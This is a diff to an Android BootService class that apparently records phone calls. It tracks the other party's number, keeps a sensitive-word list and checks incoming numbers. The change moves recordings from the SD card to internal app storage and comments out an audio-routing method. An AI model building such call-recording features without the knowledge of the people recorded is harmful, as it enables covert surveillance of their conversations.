@@ -59,7 +59,6 @@ public class BootService extends Service
 	private boolean recordStarted = false;
 	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder;
-	private String DEFAULT_PHONE_RECORD_DIR = FileCtrl.getDefaultDirStr();
 	
 	public static String[] sensitiveWordArray = null;
 	
@@ -284,11 +283,12 @@ public class BootService extends Service
     }
 	
 	private String makePhonecallRecordFileFullPath(Context context, String phoneNum, Date date) {
-		if (!FileCtrl.defaultDirExist()) FileCtrl.createDefaultSDDir();
+		//if (!FileCtrl.defaultSDDirExist()) FileCtrl.createDefaultSDDir(); // Now recording files will be saved to internal storage 
 		String fileName = context.getResources().getString(R.string.phonecall_record) + phoneNum + "-" + DatetimeUtil.format2.format(date) + FileCtrl.SUFFIX_WAV;
-		return DEFAULT_PHONE_RECORD_DIR + fileName;
+		return FileCtrl.getInternalStorageFilesDirStr(context) + fileName;
 	}
 	
+	/*
 	private void setAudio(Context context)
 	{
 		try {
@@ -304,6 +304,7 @@ public class BootService extends Service
 			audiomanager.setRouting(2, 11, 15);
 		} catch (Exception ex) {}
 	}
+	*/
 	
 	private boolean comingNumberIsLegal(Context context, String comingNum) 
 	{
